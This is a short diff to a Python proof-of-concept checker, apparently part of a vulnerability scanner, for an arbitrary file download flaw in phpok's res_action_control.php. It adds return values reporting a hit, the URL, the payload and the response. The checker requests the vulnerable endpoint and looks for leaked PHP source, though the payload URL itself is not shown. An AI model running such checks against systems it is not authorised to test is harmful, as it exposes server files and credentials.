@@ -34,11 +34,14 @@ class phpok_res_action_control_filedownload_BaseVerify:
             req = requests.get(vulnurl, headers=headers, cookies=cookies, timeout=10, verify=False)
             if r"<?php" in req.text and r"host" in req.text:
                 cprint("[+]存在phpok res_action_control.php 任意文件下载(需要cookies文件)漏洞...(高危)\tpayload: "+vulnurl+"\ncookies:"+json.dumps(cookies, indent=4), "red")
+                return True, vulnurl, "phpok res_action_control.php 任意文件下载(需要cookies文件)", payload, req.text
             else:
                 cprint("[-]不存在phpok_res_action_control_filedownload漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
